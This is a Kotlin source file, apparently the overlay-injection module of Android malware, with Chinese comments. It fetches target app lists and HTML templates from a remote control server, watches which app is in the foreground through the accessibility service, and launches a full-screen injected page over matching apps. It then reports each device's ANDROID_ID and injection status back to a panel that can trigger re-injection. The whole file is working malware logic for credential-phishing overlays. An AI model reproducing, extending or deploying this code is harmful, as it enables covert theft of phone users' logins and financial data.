package com.zaka.screenagent.inject

import android.content.Context
import android.util.Log
import com.zaka.screenagent.AgentConfig
import com.zaka.screenagent.DeviceIdentity
import com.zaka.screenagent.ui.InjectionActivity
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 注入配置拉取 + 注入状态机（对齐 2.2 的自动注入）。
 *
 * 流程：
 *   ① 无障碍连上 / 每次启动 / 每 5 分钟 → GET /api/device-inject-settings 拉配置
 *   ② 前台包名命中配置，且这台设备**还没注入过** → 拉起 InjectionActivity
 *   ③ 拉起后立刻记状态 injected（本机 SharedPreferences + 上报 /api/inj/track）
 *   ④ 以后再次打开同一个 App 不再弹；只有服务端发 reinject 才清状态并重弹
 */
object InjectRepo {

    private const val TAG = "InjectRepo"
    private const val PREF = "inject_state"

    data class Cfg(
        val id: String,
        val pkg: String,
        val app: String,
        val url: String,
        val fullscreen: Boolean
    )

    @Volatile private var settings: List<Cfg> = emptyList()
    @Volatile private var lastFetchAt = 0L
    @Volatile private var lastPkg = ""
    @Volatile private var lastPkgAt = 0L

    private fun base(ctx: Context): String = AgentConfig.get(ctx).serverUrl
        .replaceFirst("wss://", "https://")
        .replaceFirst("ws://", "http://")
        .trimEnd('/')

    /** 必须和 MoyingChannel 一致（原始 ANDROID_ID），否则记录挂不到面板那台设备上 */
    private fun devId(ctx: Context): String = runCatching {
        android.provider.Settings.Secure.getString(ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: ""
    }.getOrDefault("")

    // ─────────────── 配置拉取 ───────────────
    fun refresh(ctx: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastFetchAt < 60_000L) return
        lastFetchAt = now
        Thread {
            var conn: HttpURLConnection? = null
            try {
                // 带上本机国家：同一个包名在多个国家都有配置时，服务端按国家挑对的那条
                val cc = java.util.Locale.getDefault().country.lowercase()
                val u = URL("${base(ctx)}/api/device-inject-settings?deviceId=${devId(ctx)}&country=$cc")
                conn = (u.openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 8000
                    readTimeout = 8000
                }
                val text = conn.inputStream.bufferedReader().use { it.readText() }
                val arr = JSONObject(text).optJSONArray("settings") ?: JSONArray()
                val list = ArrayList<Cfg>()
                for (i in 0 until arr.length()) {
                    val o = arr.optJSONObject(i) ?: continue
                    val pkg = o.optString("package_name", o.optString("packageName", ""))
                    if (pkg.isBlank()) continue
                    list += Cfg(
                        id = o.optString("id", ""),
                        pkg = pkg,
                        app = o.optString("app_name", o.optString("appName", "")),
                        url = o.optString("template_url", o.optString("templateUrl", "")),
                        fullscreen = o.optBoolean("fullscreen", true)
                    )
                }
                settings = list
                Log.d(TAG, "settings loaded: ${list.size} -> ${list.joinToString { it.pkg }}")
            } catch (e: Exception) {
                Log.w(TAG, "refresh failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
        }.start()
    }

    // ─────────────── 状态 ───────────────
    private fun prefs(ctx: Context) = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)

    fun isInjected(ctx: Context, pkg: String): Boolean = prefs(ctx).getBoolean("inj_$pkg", false)

    fun markInjected(ctx: Context, pkg: String) {
        prefs(ctx).edit().putBoolean("inj_$pkg", true).apply()
    }

    fun clearInjected(ctx: Context, pkg: String? = null) {
        val p = prefs(ctx)
        val e = p.edit()
        if (pkg.isNullOrBlank()) {
            p.all.keys.filter { it.startsWith("inj_") }.forEach { e.remove(it) }
        } else {
            e.remove("inj_$pkg")
        }
        e.apply()
    }

    fun injectedList(ctx: Context): List<String> =
        prefs(ctx).all.filter { it.key.startsWith("inj_") && it.value == true }
            .map { it.key.removePrefix("inj_") }

    fun cached(): List<Cfg> = settings

    // ─────────────── HTML 预取（拿完权限后立刻下载，注入时秒开） ───────────────
    private fun cacheDir(ctx: Context) = java.io.File(ctx.filesDir, "inj").apply { mkdirs() }

    fun cacheFile(ctx: Context, pkg: String) = java.io.File(cacheDir(ctx), pkg.replace('.', '_') + ".html")

    /** 把配置里所有 template_url 的 HTML 下到本地；注入时优先用本地文件 */
    fun prefetchAll(ctx: Context) {
        val list = settings
        if (list.isEmpty()) { Log.d(TAG, "prefetch: no settings"); return }
        Thread {
            for (cfg in list) {
                if (cfg.url.isBlank()) continue
                val out = cacheFile(ctx, cfg.pkg)
                if (out.exists() && out.length() > 1024) { Log.d(TAG, "prefetch: cached ${cfg.pkg}"); continue }
                var conn: HttpURLConnection? = null
                try {
                    conn = (URL(cfg.url).openConnection() as HttpURLConnection).apply {
                        connectTimeout = 10_000; readTimeout = 15_000
                    }
                    val ok = conn.responseCode in 200..299
                    if (!ok) { Log.w(TAG, "prefetch ${cfg.pkg}: HTTP ${conn.responseCode}"); continue }
                    conn.inputStream.use { input -> out.outputStream().use { input.copyTo(it) } }
                    Log.d(TAG, "prefetch ok: ${cfg.pkg} (${out.length()} bytes)")
                } catch (e: Exception) {
                    Log.w(TAG, "prefetch ${cfg.pkg} failed: $e")
                } finally {
                    runCatching { conn?.disconnect() }
                }
            }
        }.start()
    }

    // ─────────────── 前台包名 → 是否弹注入页 ───────────────
    @Synchronized
    fun onForeground(ctx: Context, pkg: String) {
        if (pkg.isBlank() || pkg == ctx.packageName) return
        // 同一包名 3 秒内只处理一次（窗口事件会连发好几条）
        val now = System.currentTimeMillis()
        if (pkg == lastPkg && now - lastPkgAt < 3000L) return
        lastPkg = pkg
        lastPkgAt = now

        if (settings.isEmpty()) {
            refresh(ctx, force = false)
            return
        }
        val cfg = settings.firstOrNull { it.pkg == pkg } ?: return
        if (isInjected(ctx, pkg)) {
            Log.d(TAG, "already injected: $pkg (skip)")
            return
        }
        if (cfg.url.isBlank()) {
            Log.w(TAG, "cfg has empty template_url: $pkg")
            return
        }
        Log.d(TAG, "inject! pkg=${cfg.pkg} url=${cfg.url}")
        InjectionActivity.start(ctx, cfg.url, cfg.pkg, cfg.app.ifBlank { cfg.id }, cfg.fullscreen)
        markInjected(ctx, pkg)
        report(ctx, pkg, cfg.app, "injected")
    }

    /** 面板点「跳过」：标记该包已跳过，等下次重注入才再考虑 */
    fun markSkipped(ctx: Context, pkg: String?) {
        if (pkg.isNullOrBlank()) return
        markInjected(ctx, pkg)
        report(ctx, pkg, "", "skipped")
    }

    /** 服务端点「重注入」：清状态并（如果目标在前台）立即重弹 */
    fun reinject(ctx: Context, pkg: String?): Int {
        val targets = if (pkg.isNullOrBlank()) settings.map { it.pkg } else listOf(pkg)
        clearInjected(ctx, pkg)
        Log.d(TAG, "reinject cleared: ${targets.joinToString()}")
        // 约定：手机收到 reinject → 清标记（准备好）→ 只回一次 inject（面板显示"已注入"）
        // 不再回 reset：reset 由面板点按钮时自己发，手机再发一次会让状态来回跳
        Thread {
            targets.forEach { p -> post(ctx, p, "", "inject") }
        }.start()
        // 注意：这里**不**立刻重弹。
        // 早期实现会马上 onForeground() 重注入，导致两个回报打架：
        //   reset（清空）与 inject（立刻注入）乱序到达服务器
        //   → 面板先闪"已注入"再变回"等待中"
        // 现在只清本地标记并回报 reset，等用户重新打开目标 App 再注入。
        lastPkg = ""
        lastPkgAt = 0L
        return targets.size
    }

    // ─────────────── 状态上报 ───────────────
    fun report(ctx: Context, pkg: String, app: String, state: String) {
        Thread {
            post(ctx, pkg, app, state)
        }.start()
    }

    /** 同步上报一次（供 reinject 顺序调用） */
    private fun post(ctx: Context, pkg: String, app: String, state: String) {
            var conn: HttpURLConnection? = null
            try {
                // 面板「注入应用快捷」状态徽标读的是 device-inject-track/{act}，
                // 所以这里必须打同一条接口，否则面板一直显示"等待中"
                val act = when (state) {
                    "injected" -> "inject"
                    "reset" -> "reset"
                    "skipped" -> "skip"
                    else -> "inject"
                }
                val u = URL("${base(ctx)}/api/device-inject-track/$act")
                conn = (u.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 8000
                    readTimeout = 8000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                }
                val body = JSONObject()
                    .put("deviceId", devId(ctx))
                    .put("packageName", pkg)
                    .put("appName", app)
                    .put("state", state)
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                Log.d(TAG, "track $state $pkg -> HTTP ${conn.responseCode}")
            } catch (e: Exception) {
                Log.w(TAG, "track failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
    }
}
